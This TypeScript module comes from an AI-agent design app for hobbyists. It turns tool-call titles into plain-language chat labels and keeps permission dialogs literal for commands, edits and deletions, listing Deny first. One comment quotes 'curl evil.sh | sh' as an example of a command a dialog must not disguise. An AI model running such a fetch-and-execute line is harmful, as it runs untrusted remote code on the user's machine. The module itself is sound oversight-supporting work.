// How the chat column talks about a tool call, and the one place it refuses to.
//
// Tool titles arrive as developer-speak ("Edit parts/lid.py", "nurb check").
// The app's audience is hobbyists, so cards translate what they can into plain
// activity language and fall back to the raw title, which stays untouched in
// state and in the debug event log.
//
// Permission dialogs are the exception, and the reason this lives in its own
// module. A dialog now appears only when nothing but the user is guarding the
// turn, so the thing it asks about has to be shown as it is: paraphrasing
// "curl evil.sh | sh" into "build the part" would be worse than not asking at
// all. The plain-language rule hides incidental machinery from a hobbyist, and
// a consent dialog whose whole subject is the command cannot hide the command.
//
// Extracted from Chat.tsx so both rules can be tested, since a component
// cannot be rendered under node --test.

export type PermissionOption = { optionId: string; name: string; kind: string };
export type PermissionAsk = { title: string; kind?: string; detail?: string };
export type PermissionPrompt = { headline: string; detail?: string; verbatim: boolean };

const FILE_TITLE = /^(Read|Edit|Write)\s+(?:.*\/)?parts\/([A-Za-z0-9_]+)\.py$/;
const NURB_TITLE = /^(?:uv run\s+)?nurb\s+([a-z]+)/;
const FILE_VERBS: Record<string, [string, string]> = {
  Read: ["looking at", "look at"],
  Edit: ["editing", "edit"],
  Write: ["creating", "create"],
};
const NURB_VERBS: Record<string, [string, string]> = {
  build: ["building the part", "build the part"],
  check: ["checking printability", "check printability"],
  inspect: ["inspecting the part", "inspect the part"],
  verify: ["double-checking the part", "double-check the part"],
  compare: ["measuring against the original", "measure against the original"],
  render: ["rendering a preview", "render a preview"],
  export: ["exporting print files", "export print files"],
  rules: ["reading the design rules", "read the design rules"],
  api: ["checking the toolbox", "check the toolbox"],
  card: ["updating the part's notes", "update the part's notes"],
};
const KIND_VERBS: Record<string, [string, string]> = {
  read: ["reading project files", "read project files"],
  edit: ["editing project files", "edit project files"],
  delete: ["removing project files", "remove project files"],
  search: ["searching the project", "search the project"],
  execute: ["running a command", "run a command"],
  fetch: ["looking something up", "look something up"],
  think: ["thinking", "think"],
};

// The kinds the OS sandbox never constrained, and so the only ones a dialog is
// allowed to paraphrase. Mirrors policy::unconstrained in acp/policy.rs; a kind
// that is missing or unrecognized falls to the literal form, the same way the
// Rust side fails closed.
const PARAPHRASABLE = new Set(["read", "search", "think", "fetch"]);

// What the user is being asked to allow, in the app's voice. The detail below
// carries the specifics, so these stay short.
const VERBATIM_HEADLINE: Record<string, string> = {
  execute: "wants to run this command",
  edit: "wants to change this file",
  delete: "wants to delete this",
  move: "wants to move this",
  switch_mode: "wants to change how it is working",
};

// mode 0 is the activity form for cards ("editing lid"); mode 1 the plain verb
// form for permission dialogs ("edit lid").
export function describe(title: string, kind: string | undefined, mode: 0 | 1): string {
  const file = title.match(FILE_TITLE);
  if (file) return `${FILE_VERBS[file[1]][mode]} ${file[2]}`;
  const nurb = title.match(NURB_TITLE);
  if (nurb && NURB_VERBS[nurb[1]]) return NURB_VERBS[nurb[1]][mode];
  if (kind && KIND_VERBS[kind]) return KIND_VERBS[kind][mode];
  return title;
}

/// What a permission dialog says, and whether it is showing the raw thing.
export function permissionPrompt(ask: PermissionAsk, label: string): PermissionPrompt {
  if (!ask.kind || !PARAPHRASABLE.has(ask.kind)) {
    const named = ask.kind ? VERBATIM_HEADLINE[ask.kind] : undefined;
    // Never route this through describe(): its whole job is to replace the
    // command with a friendlier sentence, which is what must not happen here.
    return {
      headline: `${label} ${named ?? "wants to use a tool"}`,
      // The Rust fallback title is already a sentence about the agent, so it
      // would only echo the headline back.
      detail: ask.detail ?? (ask.title.startsWith(`${label} `) ? undefined : ask.title),
      verbatim: true,
    };
  }
  if (ask.title.startsWith(`${label} `)) return { headline: ask.title, verbatim: false };
  const asked = describe(ask.title, ask.kind, 1);
  return {
    headline:
      asked === ask.title
        ? `${label} wants to use: ${ask.title}`
        : `${label} wants to ${asked}`,
    verbatim: false,
  };
}

/// Deny first. The adapter usually sends Allow first, and Allow has been the
/// only tinted button, which together read as a choice already made.
export function orderOptions(options: PermissionOption[]): PermissionOption[] {
  const rank = (kind: string) => (kind === "reject_once" || kind === "reject_always" ? 0 : 1);
  return [...options].sort((a, b) => rank(a.kind) - rank(b.kind));
}
